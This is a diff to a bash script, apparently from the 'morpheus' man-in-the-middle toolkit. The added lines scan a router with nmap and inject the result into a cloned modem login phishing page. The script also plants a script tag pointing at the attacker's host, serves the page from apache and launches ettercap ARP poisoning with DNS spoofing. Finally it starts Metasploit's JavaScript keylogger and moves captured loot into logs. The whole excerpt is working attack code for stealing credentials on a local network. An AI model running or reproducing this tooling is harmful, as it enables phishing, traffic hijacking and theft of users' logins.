@@ -1471,13 +1471,19 @@ rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison setti
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 
 
-  # dowloading/clonning website target
+  # retrieve info about modem to inject into clone
+  echo ${BlueF}[☠]${white} Gather Info about modem webpage${RedF}! ${Reset};
+  nmap -sV -PN -p 80 $GaTe > $IPATH/output/retrieve.log
+  InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | cut -d '(' -f2 | cut -d ')' -f1`
+
+  # building cloned login modem webpage
   cd $IPATH/bin/phishing/router-modem
   cp index.html index.rb > /dev/null 2>&1
   echo ${BlueF}[☠]${white} Inject javascript Into clone webpage${RedF}!${Reset};
   sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
   mv copy.html index.html > /dev/null 2>&1
   sed -i "s|GatWa|$GaTe|g" index.html
+  sed -i "s|DiSpt|$InjE|g" index.html
   # copy all files to apache2 webroot
   echo ${BlueF}[☠]${white} Copy files to apache2 webroot${RedF}!${Reset};
   sleep 2
@@ -1487,9 +1493,8 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   cp -r $IPATH/bin/phishing/router-modem $ApachE/router-modem > /dev/null 2>&1
   cd $IPATH
 
-
     # backup all files needed.
-    echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+    echo ${BlueF}[☠]${white} Backup all files needed${RedF}!${Reset};
     cd $IPATH/bin
     cp $IPATH/bin/etter.dns $IPATH/bin/etter.rb # backup (NO dev/null to report file not existence)
     cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
@@ -1524,13 +1529,13 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
         xterm -T "MORPHEUS TCP/IP HIJACKING" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost/ /$gateway/
       fi
 
-
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv /root/.msf4/loot/*.txt $IPATH/logs > /dev/null 2>&1
   mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
   mv $IPATH/bin/phishing/router-modem/index.rb $IPATH/bin/phishing/router-modem/index.html
   mv /tmp/etter.dns $Edns > /dev/null 2>&1
+  rm $IPATH/output/retrieve.log > /dev/null 2>&1
   rm $ApachE/index.html > /dev/null 2>&1
   rm $ApachE/login.html > /dev/null 2>&1
   rm -r $ApachE/router-modem > /dev/null 2>&1
